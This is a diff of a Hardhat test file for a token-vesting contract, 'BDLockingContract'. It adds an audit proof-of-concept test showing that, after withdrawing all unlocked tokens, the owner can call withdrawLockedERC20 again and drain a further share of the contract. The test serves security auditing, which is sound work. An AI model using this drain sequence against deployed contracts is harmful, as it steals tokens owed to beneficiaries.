@@ -56,7 +56,7 @@ describe("BDLockingContract", function () {
 
   const durationSeconds: number = 10 * 24 * 60 * 60; // 10 days
   const cliffDurationSeconds: number = 2 * 24 * 60 * 60; // 2 days
-  const erc20TotalSupply: number = 98394797;
+  const erc20TotalSupply: number = 100000;
   const percisionOffset: number = 150;
 
   beforeEach(async function () {
@@ -358,6 +358,67 @@ describe("BDLockingContract", function () {
       expect(this.lockingContract.connect(this.owner).withdrawLockedERC20(this.erc20Contract.address, 10)).to.be.rejectedWith(
         "BDLockingContract: The withdrawal amount must be between 1 to the amount of locked tokens"
       );
+    });
+
+    // it.only("shouldn't allow to withdraw unlocked tokens", async function () {
+    //   let timestamp = this.startTimestamp + Math.round(durationSeconds / 3); // Jump to 1/3 of the total duration
+    //   await ethers.provider.send("evm_mine", [timestamp]);
+    //   await this.lockingContract.connect(this.firstBeneficiary).release(this.erc20Contract.address);
+    //   console.log("released", (await this.lockingContract.released(this.erc20Contract.address)).toString());
+
+    //   timestamp = this.startTimestamp + Math.round((durationSeconds * 2) / 3); // Jump to 2/3 of the total duration
+    //   await ethers.provider.send("evm_mine", [timestamp]);
+    //   const withdrawalAmount = Math.round(erc20TotalSupply / 4);
+    //   console.log("withdrawalAmount", withdrawalAmount);
+    //   await ethers.provider.send("evm_setAutomine", [false]);
+
+    //   const tx1 = await this.lockingContract.connect(this.owner).withdrawLockedERC20(this.erc20Contract.address, withdrawalAmount);
+    //   const tx2 = await this.lockingContract.connect(this.owner).withdrawLockedERC20(this.erc20Contract.address, withdrawalAmount);
+
+    //   await ethers.provider.send("evm_mine", []);
+    //   await Promise.all([tx1.wait(), tx2.wait()]);
+
+    //   console.log("balance =", await this.erc20Contract.balanceOf(this.lockingContract.address));
+    // });
+
+    it.only("AUDIT test1: withdrawying twice will fail", async function () {
+      console.log("- move TIME 1/3 of the vesting period");
+      await ethers.provider.send("evm_mine", [this.startTimestamp + durationSeconds / 3]);
+      console.log(`balance of firstBenefiiciary`, await this.erc20Contract.balanceOf(this.firstBeneficiary.address));
+      console.log(`lockingcontract balance:`, await this.erc20Contract.balanceOf(this.lockingContract.address));
+      console.log("- release tokns to first benefiiciary");
+      await this.lockingContract.connect(this.firstBeneficiary).release(this.erc20Contract.address);
+      console.log(`balance of firstBenefiiciary`, await this.erc20Contract.balanceOf(this.firstBeneficiary.address));
+      console.log(`lockingcontract balance:`, await this.erc20Contract.balanceOf(this.lockingContract.address));
+      console.log("- withdraw 50% of remaining locked tokens");
+      await this.lockingContract.connect(this.owner).withdrawLockedERC20(this.erc20Contract.address, 33333);
+      // Each beneficiary with 11,111 (*3)
+      // Owner has withdrawn 33,333
+      // 33,333 left in contract
+
+      console.log("\nMOVE TIME TO 2/3 of the vesting period");
+      await ethers.provider.send("evm_mine", [this.startTimestamp + (durationSeconds * 2) / 3]);
+      const balanceInContract = await this.erc20Contract.balanceOf(this.lockingContract.address);
+      console.log(`lockingcontract balance after withdrawal:`, balanceInContract);
+      const totalAllocation = await this.lockingContract.totalAllocation(this.erc20Contract.address);
+      console.log(`lockingcontract totalAllocation:`, totalAllocation);
+      const freedAmount = await this.lockingContract.freedAmount(this.erc20Contract.address);
+      console.log(`lockingcontract freedAmount:`, freedAmount);
+      console.log(`lockingcontract released:`, await this.lockingContract.released(this.erc20Contract.address));
+      const withdraw = totalAllocation.sub(freedAmount).toNumber();
+      console.log("\n- withdraw all 100% of lunlokeced tokens", withdraw);
+      await this.lockingContract.connect(this.owner).withdrawLockedERC20(this.erc20Contract.address, withdraw);
+      console.log(`lockingcontract balance after withdrawal:`, await this.erc20Contract.balanceOf(this.lockingContract.address));
+      console.log(`lockingcontract totalAllocation:`, await this.lockingContract.totalAllocation(this.erc20Contract.address));
+      console.log(`lockingcontract freedAmount:`, await this.lockingContract.freedAmount(this.erc20Contract.address));
+      console.log(`lockingcontract released:`, await this.lockingContract.released(this.erc20Contract.address));
+
+      console.log(`Now it should be impossible for the owner to withdraw anymore tokens (they withdrew 100% after all)`);
+      console.log(`But instead, she can drain the contract by claiming another 75%!!!`);
+      console.log(`-claiming 75%...`);
+      await this.lockingContract.connect(this.owner).withdrawLockedERC20(this.erc20Contract.address, 7500);
+      console.log(`lockingcontract balance after withdrawal:`, await this.erc20Contract.balanceOf(this.lockingContract.address));
+      console.log(`lockingcontract freedAmount:`, await this.lockingContract.freedAmount(this.erc20Contract.address));
     });
   });
 });
